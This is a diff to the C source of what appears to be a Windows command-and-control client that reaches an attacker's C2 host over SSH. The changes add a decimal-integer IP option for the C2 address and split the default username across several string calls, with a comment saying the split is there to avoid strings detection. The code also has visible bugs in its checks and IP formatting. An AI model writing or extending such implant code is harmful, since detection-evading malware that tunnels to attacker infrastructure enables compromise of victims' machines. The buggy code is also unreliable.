@@ -36,52 +36,83 @@ void help(char* self) {
     debug("Usage: %s [user@C2_hostname [LOCAL_SSH_SERVER_PORT]\n", self);
     debug("Example: %s user@C2_hostname\n", self);
     debug("Example: %s user@C2_hostname 1234\n", self);  
+    debug("Example: %s -t 16909060\n", self);
     debug("Example: %s hostname\n", self);
     debug("Defaults: user is `anonymous` and LOCAL_SSH_SERVER_PORT is 2222\n");
     exit(1);
 }
 
+#include <ws2tcpip.h>
+void integer_to_ip(int ip, char* result) {
+
+    unsigned char bytes[4];
+    bytes[0] = ip & 0xFF;
+    bytes[1] = (ip >> 8) & 0xFF;
+    bytes[2] = (ip >> 16) & 0xFF;
+    bytes[3] = (ip >> 24) & 0xFF;
+    snprintf(result, 15, "%d.%d.%d.%d\n", bytes[3], bytes[2], bytes[1], bytes[0]);
+}
+
 void parse_args(int argc, char** argv,
-    char** C2_host,
+    char* C2_host,
     int* ssh_server_port_int,
     char* username) {
 
+    char* ptr;
     char* C2_port = NULL;
     char* ssh_server_port = NULL;
     if (argc < 2 || argc > 3) {
         help(argv[0]);
     }
 
-    *C2_host = strchr(argv[1], '@');
-    if (*C2_host != NULL){
-        *C2_host[0] = '\0';
-        (*C2_host)++;
-        strncpy(username, argv[1], 100);
+    /* integer IP*/
+    if (argc == 3 && memcmp(argv[1], "-t", 2) == 0) {
+        unsigned long ip_integuer = strtoul(argv[2], NULL, 10);
+        if (ip_integuer == NULL) {
+            help(argv[0]);
+        }
+        integer_to_ip(ip_integuer, C2_host);
+        return;
+    }
+
+    ptr = strchr(argv[1], '@');
+    if (ptr != NULL){
+        ptr[0] = '\0';
+        memcpy_s(username, 100, argv[1], strlen(argv[1]));
+        memcpy_s(C2_host, 255, ptr + 1, strlen(ptr + 1));
     }
     else {
-        *C2_host = argv[1];
-        strncat(username, "anon", 100); // default user, splitted to avoid strings detection
-        strncat(username, "ymous", 100);
+        strncpy(C2_host, argv[1], 255);
     }
 
     if (argc == 3) {
         ssh_server_port = argv[2];
         *ssh_server_port_int = atoi(ssh_server_port);
-        if (ssh_server_port_int == 0)
+        if (ssh_server_port_int == 0) {
             help(argv[0]);
+        }
     }
 
+    if (C2_host[0] == '0') {
+        help(argv[0]);
+    }
+    
 }
 
 int main(int argc, char** argv){
     char* C2_port = NULL;    
-    char* C2_host = NULL;
+    char C2_host[256] = {0};
     char* ssh_server_port = NULL;
     int ssh_server_port_int = 2222;
     char username[101] = {0};
 
+    // default user, splitted to avoid strings detection
+    strncat(username, "ano", 100); 
+    strncat(username, "nym", 100);
+    strncat(username, "ous", 100);
+
     
-    parse_args(argc, argv, &C2_host, &ssh_server_port_int, username);
+    parse_args(argc, argv, C2_host, &ssh_server_port_int, username);
 
     ssh_init(); // mandatory
 
